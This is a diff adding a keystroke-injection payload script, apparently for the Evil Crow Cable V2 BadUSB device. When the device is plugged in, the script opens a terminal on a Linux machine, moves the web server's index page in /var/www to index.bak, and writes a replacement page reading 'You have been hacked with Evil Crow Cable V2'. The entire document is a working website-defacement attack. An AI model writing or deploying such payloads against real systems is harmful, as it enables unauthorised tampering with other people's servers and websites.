@@ -1,0 +1,25 @@
+Delay 1000
+RunUnix gnome-terminal
+Delay 3000
+PrintLine cd /var/www
+Delay 2000
+PrintLine mv index.* index.bak
+Delay 2000
+PrintLine touch index.html
+Delay 2000
+PrintLine nano index.html
+Delay 2000
+PrintLine <marquee><h1>You have been hacked with Evil Crow Cable V2</h1></marquee>
+Delay 2000
+PrintLine <center><a href="http://www.usbrubberducky.com/"><img src="http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg" /></a><center>
+Delay 2000
+PrintLine <center><h5>Your old index page can be found <a href="./index.bak">here.</a></h5></center>
+Delay 2000
+Press KEY_LEFT_CTRL
+Print x
+Delay 100
+Release
+Delay 2000
+PrintLine y
+Delay 3000
+PrintLine exit
